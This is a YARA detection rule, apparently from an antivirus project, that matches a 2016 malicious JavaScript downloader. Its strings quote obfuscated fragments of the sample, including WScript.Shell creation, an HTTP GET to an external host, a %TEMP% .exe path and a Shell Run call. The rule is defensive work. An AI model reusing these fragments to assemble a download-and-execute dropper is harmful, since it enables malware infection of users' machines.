rule sig_20160328_833f43d3e1e706d13ed4e081a4725758 {
  meta:
    description = "datamaliciousorder - file 20160328_833f43d3e1e706d13ed4e081a4725758.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "17efca84b45aa95fa9e3dbe5443a66adfa38196d5c60742ca7655640ba4e0e7f"

  strings:
    $s1  = "function Orpquj() {return Xepbxa[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"IHniGMQA7H.exe\";};" fullword ascii
    $s2  = "Isavc[Mpdblpz](\"GET\", \"http://www.hiveclick.com/m4usd\", false);" fullword ascii
    $s3  = "var Xepbxa = function Utqnbix() {return WScript[Lgetpr](\"WScript.Shell\");}();" fullword ascii
    $s4  = "do {WScript[Ipesxuuaa](Jadqectmyh() * 11)} while (Isavc[\"readystate\"] < 4 );" fullword ascii
    $s5  = "function Ofmlefjlqi(Knpgvwgxhl, Ufjgivdaon){return Knpgvwgxhl - Ufjgivdaon;};" fullword ascii
    $s6  = "function Mibgniqbx(){return Lgetpr;};" fullword ascii
    $s7  = "function Vyzqduqk() {return ((Bolfhl == true) && (Bolfhl == Hxqcjmj)) ? 1 : Izeyvr;};" fullword ascii
    $s8  = "function Mmbdaudz(Tpxrstwsyt){Xepbxa[\"Run\"](Tpxrstwsyt, Izeyvr, Izeyvr);};" fullword ascii
    $s9  = "return Ofmlefjlqi(Qrvjbxtcyy, Mobmd);" fullword ascii
    $s10 = "function Afpenscsg(){return Dxmaku;};" fullword ascii
    $s11 = "function Rvvjmajyx(Vsuxbbmotc) {var Cxysapvque = (1, 2, 3, 4, 5, Vsuxbbmotc); return Cxysapvque;};" fullword ascii
    $s12 = "var Hxqcjmj = false;" fullword ascii
    $s13 = "var Qyrhif = false;" fullword ascii
    $s14 = "var Bolfhl = false;" fullword ascii
    $s15 = " while (Zyogsn){" fullword ascii
    $s16 = "function Jadqectmyh(){return 22;};" fullword ascii
    $s17 = "Hxqcjmj = true; " fullword ascii
    $s18 = "Bolfhl = true; " fullword ascii
    $s19 = "function Jepuqiabyd()" fullword ascii
    $s20 = "var Lvxltxr = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}